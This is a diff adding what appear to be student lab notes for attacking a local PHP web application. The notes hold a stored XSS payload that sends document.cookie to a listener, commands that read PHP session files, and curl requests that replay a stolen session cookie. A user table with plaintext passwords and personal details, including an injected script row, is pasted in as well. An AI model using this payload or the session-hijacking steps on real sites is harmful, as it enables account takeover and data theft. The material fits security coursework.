@@ -1,0 +1,30 @@
+ls -l /var/lib/php/sessions
+
+cat /var/lib/php/sessions/sess_
+
+<script>document.write('<img src="http://127.0.0.1:8000/index.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');</script>
+
+curl -i -L -X GET "http://127.0.0.1/pages/user/user_page.php?id=4" -b 
+
+
+
+curl -L -i -X POST "http://127.0.0.1/pages/public/login.php" \
+    -d "email=john.doe@insa-cvl.fr" \
+    -d "password=111" \
+    -d "login_btn=$LOGIN_BTN" 
+
+tail -f /var/log/apache2/error.log
+
+
+curl -i -L -X GET "http://127.0.0.1/pages/user/user_page.php?id=4" -b "PHPSESSID="
+
+
+
+
+
+john.doe@insa-cvl.fr 	111 	Joe 	John 	M 	1990-01-01 	123 Main St 	0123456789 	default 	Student
+jane.doe@insa-cvl.fr 	azerty 	Doe 	Jane 	M 	1992-05-15 	456 Elm St 	9876543210 	default 	Professor
+admin@insa-cvl.fr 	abcdefg 	Admin 	User 	M 	1985-09-30 	789 Oak St 	5678901234 	default 	Professor
+1 	1 	<script>document.write('<img src="http://127.0.0.1... 	1 	M 	2024-12-10 	1 	1 	1_1.jpg 	Student
+tom@gmail.com 	1234 	CONSTANS 	Mathis 	M 	2003-11-27 	123 rue Exemple 	0606060706 	CONSTANS_mathis.jpg 	Student
+9 	2 	2 	2
